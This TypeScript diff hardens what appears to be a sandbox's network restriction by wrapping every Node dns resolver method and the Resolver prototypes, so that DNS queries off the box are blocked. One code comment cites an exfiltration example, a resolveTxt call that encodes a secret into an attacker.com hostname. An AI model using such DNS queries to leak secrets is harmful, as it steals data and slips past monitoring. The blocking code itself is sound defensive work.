@@ -119,12 +119,53 @@ export async function installNetworkRestriction() {
         const name = typeof args[0] === "string" ? args[0] : "<name>"
         throw new Error(`${denyMsg} (dns resolve of ${name})`)
       }
-    for (const key of ["lookup", "resolve", "resolve4", "resolve6", "resolveAny"] as const) {
+    // Every resolver method that emits a DNS query off-box. resolveTxt/resolveMx
+    // etc. are exfil channels just like lookup — a partial list (lookup/resolve
+    // only) leaves dns.resolveTxt("<secret>.attacker.com") wide open.
+    const CALLBACK_METHODS = [
+      "lookup",
+      "lookupService",
+      "resolve",
+      "resolve4",
+      "resolve6",
+      "resolveAny",
+      "resolveCname",
+      "resolveCaa",
+      "resolveMx",
+      "resolveNaptr",
+      "resolveNs",
+      "resolvePtr",
+      "resolveSoa",
+      "resolveSrv",
+      "resolveTxt",
+      "reverse",
+    ] as const
+    // The promise API has the same resolver surface minus lookupService.
+    const PROMISE_METHODS = CALLBACK_METHODS.filter((k) => k !== "lookupService")
+    for (const key of CALLBACK_METHODS) {
       if (typeof dns[key] === "function") dns[key] = wrap(dns[key])
     }
     if (dns.promises && typeof dns.promises === "object") {
-      for (const key of ["lookup", "resolve", "resolve4", "resolve6", "resolveAny"] as const) {
+      for (const key of PROMISE_METHODS) {
         if (typeof dns.promises[key] === "function") dns.promises[key] = wrapPromise(dns.promises[key])
+      }
+    }
+    // A `new dns.Resolver()` (or promises.Resolver) instance holds its own copies
+    // of these methods, bypassing the module-level patches above. Patch the
+    // prototypes so instances are covered too.
+    const callbackResolver = (dns as { Resolver?: { prototype?: Record<string, unknown> } }).Resolver
+    if (callbackResolver?.prototype) {
+      for (const key of PROMISE_METHODS) {
+        if (typeof callbackResolver.prototype[key] === "function")
+          callbackResolver.prototype[key] = wrap(callbackResolver.prototype[key])
+      }
+    }
+    const promiseResolver = (dns.promises as { Resolver?: { prototype?: Record<string, unknown> } } | undefined)
+      ?.Resolver
+    if (promiseResolver?.prototype) {
+      for (const key of PROMISE_METHODS) {
+        if (typeof promiseResolver.prototype[key] === "function")
+          promiseResolver.prototype[key] = wrapPromise(promiseResolver.prototype[key])
       }
     }
   } catch {
